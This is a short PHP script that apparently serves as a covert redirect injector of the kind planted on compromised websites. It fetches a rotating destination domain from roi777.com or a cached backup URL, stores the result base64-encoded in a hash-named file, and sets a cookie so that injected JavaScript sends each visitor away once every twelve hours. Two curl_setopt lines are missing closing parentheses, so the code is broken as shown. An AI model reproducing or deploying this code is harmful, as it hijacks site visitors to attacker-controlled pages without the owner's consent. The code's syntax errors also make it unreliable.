<?php

$index_url = "/index/?2601510941471";
$hash_file = '71ba5704c07aec55402cb7d674cb5783';
$sys_time = time();
$mod_time = filemtime($hash_file);
$time_diff = $sys_time - $mod_time;

if (file_exists($hash_file)) {
    $fh1 = @fopen($hash_file, 'r');
    $dec_json = json_decode(base64_decode(fread($fh1, filesize($hash_file))), 1);
    fclose($fh1);
}

if ($time_diff >= 60 || !file_exists($hash_file)) {
    $droi_res = getDDroi($hash_file);
    if ($droi_res['domain']) {
        $redir_url = 'http://' . $droi_res['domain'] . $index_url;
    } else {
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_USERAGENT, 'AI rsrv');
        curl_setopt($ch, CURLOPT_URL, $dec_json['rsrv']);
        curl_setopt($ch, CURLOPT_TIMEOUT, 10);
        $curl_res1 = curl_exec($ch);
        curl_close($ch);
        $redir_url = 'http://' . $curl_res1 . $index_url;
    }
} else {
    $redir_url = 'http://' . $dec_json['domain'] . $index_url;
}

function getDDroi($hash_file) {
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_USERAGENT, 'AI roi';
    curl_setopt($ch, CURLOPT_URL, 'http://roi777.com/domain_temp.php?f=json';
    curl_setopt($ch, CURLOPT_TIMEOUT, 10);
    $curl_res2 = curl_exec($ch);
    curl_close($ch);
    $dec_json = json_decode($curl_res2, true);
    if ($dec_json['domain']) {
        $fh2 = @fopen($hash_file, 'w+');
        @fwrite($fh2, base64_encode($curl_res2));
        @fclose($fh2);
        return $dec_json;
    } else return false;
}

if (!$_COOKIE['a777d']) {
    setcookie('a777d', 1, time() + 43200, '/');
    echo '<script>window.location.replace("' . $redir_url . '");window.location.href = "' . $redir_url . '";</script>';
}

?>
